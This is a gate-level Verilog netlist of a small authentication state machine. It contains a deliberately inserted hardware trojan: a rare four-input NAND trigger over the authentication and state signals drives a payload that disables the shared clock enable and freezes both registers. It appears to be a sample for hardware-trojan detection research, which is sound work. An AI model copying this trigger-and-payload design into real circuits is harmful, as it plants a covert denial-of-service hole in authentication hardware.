// Flat gate-level Verilog netlist
// Design: Simple authentication FSM with register bank and shared clock enable
// Cells from cells.lib

module top (
    input  wire clk,
    input  wire rst_n,
    input  wire auth_in,
    output wire auth_out,
    output wire state_out
);

    // Internal wires
    wire update_en;
    wire nand4_out;
    wire payload_out;
    wire fsm_state;
    wire next_state;
    wire auth_reg;

    // Trigger cone: rare 4-input NAND
    // Inputs: auth_in, fsm_state, auth_reg, and a constant-1 tie
    NAND4 trigger_gate (
        .A(auth_in),
        .B(fsm_state),
        .C(auth_reg),
        .D(1'b1),
        .Y(nand4_out)
    );

    // Payload: when trigger activates (nand4_out=0), force update_en low
    // Otherwise, update_en is normally high (1'b1)
    NOR2 payload_gate (
        .A(nand4_out),
        .B(1'b0),
        .Y(payload_out)
    );
    INV inv_payload (
        .A(payload_out),
        .Y(update_en)
    );

    // FSM register with clock enable
    DFF fsm_reg (
        .CLK(clk),
        .RST_N(rst_n),
        .EN(update_en),
        .D(next_state),
        .Q(fsm_state)
    );

    // Next-state logic: simple toggle on auth_in
    XOR2 next_state_gate (
        .A(fsm_state),
        .B(auth_in),
        .Y(next_state)
    );

    // Authentication register with clock enable
    DFF auth_reg_inst (
        .CLK(clk),
        .RST_N(rst_n),
        .EN(update_en),
        .D(auth_in),
        .Q(auth_reg)
    );

    // Outputs
    assign auth_out = auth_reg;
    assign state_out = fsm_state;

endmodule